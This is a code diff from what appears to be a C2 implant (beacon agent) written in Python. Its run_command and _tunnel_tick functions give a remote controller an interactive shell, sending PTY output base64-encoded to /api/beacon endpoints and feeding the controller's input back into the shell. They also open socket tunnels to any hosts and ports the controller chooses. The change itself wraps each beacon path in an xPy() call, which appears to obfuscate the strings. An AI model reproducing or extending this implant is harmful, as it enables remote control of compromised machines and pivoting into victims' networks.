@@ -2991,10 +2991,10 @@ def run_command(cmd, task_id=None):
                     while True:
                         c = _proc.stdout.read(512)
                         if not c: break
-                        _post('/api/beacon/pty_tick', {'session_id': sid, 'data': _b64.b64encode(c).decode()})
+                        _post(${xPy('/api/beacon/pty_tick')}, {'session_id': sid, 'data': _b64.b64encode(c).decode()})
                 _th.Thread(target=_rd, daemon=True).start()
                 while _proc.poll() is None:
-                    tk = _post('/api/beacon/pty_tick', {'session_id': sid, 'data': ''})
+                    tk = _post(${xPy('/api/beacon/pty_tick')}, {'session_id': sid, 'data': ''})
                     if not tk or not tk.get('active'): _proc.kill(); break
                     if tk.get('input'):
                         try: _proc.stdin.write(_b64.b64decode(tk['input'])); _proc.stdin.flush()
@@ -3012,7 +3012,7 @@ def run_command(cmd, task_id=None):
                         if _r:
                             try: _out = os.read(_mfd, 4096)
                             except OSError: break
-                        tk = _post('/api/beacon/pty_tick', {'session_id': sid, 'data': _b64.b64encode(_out).decode() if _out else ''})
+                        tk = _post(${xPy('/api/beacon/pty_tick')}, {'session_id': sid, 'data': _b64.b64encode(_out).decode() if _out else ''})
                         if not tk or not tk.get('active'): break
                         if tk.get('input'):
                             try: os.write(_mfd, _b64.b64decode(tk['input']))
@@ -3022,7 +3022,7 @@ def run_command(cmd, task_id=None):
                     try: os.close(_mfd)
                     except: pass
                 except Exception as _e:
-                    _post('/api/beacon/pty_tick', {'session_id': sid, 'data': _b64.b64encode(f'PTY error: {_e}\\n'.encode()).decode()})
+                    _post(${xPy('/api/beacon/pty_tick')}, {'session_id': sid, 'data': _b64.b64encode(f'PTY error: {_e}\\n'.encode()).decode()})
         _th.Thread(target=_pty_run, daemon=True).start()
         return '__pty_started__'
 
@@ -3125,7 +3125,7 @@ def _tunnel_tick():
             except: pass
             if data:
                 items.append({'channel_id': cid, 'data': _b64.b64encode(data).decode(), 'closed': False})
-    resp = _post('/api/beacon/tunnel/tick', {'agent_id': AGENT_ID, 'items': items})
+    resp = _post(${xPy('/api/beacon/tunnel/tick')}, {'agent_id': AGENT_ID, 'items': items})
     if not resp: return
     for item in resp.get('items', []):
         action = item.get('action'); cid = item.get('channel_id')
@@ -3134,7 +3134,7 @@ def _tunnel_tick():
                 s = socket.socket(); s.settimeout(10); s.connect((item['host'], item['port']))
                 with _tnl_lock: _tnl[cid] = {'sock': s, 'closed': False}
             except:
-                _post('/api/beacon/tunnel/tick', {'agent_id': AGENT_ID, 'items': [{'channel_id': cid, 'data': '', 'closed': True}]})
+                _post(${xPy('/api/beacon/tunnel/tick')}, {'agent_id': AGENT_ID, 'items': [{'channel_id': cid, 'data': '', 'closed': True}]})
         elif action == 'data' and cid:
             with _tnl_lock: ch = _tnl.get(cid)
             if ch and not ch.get('closed'):
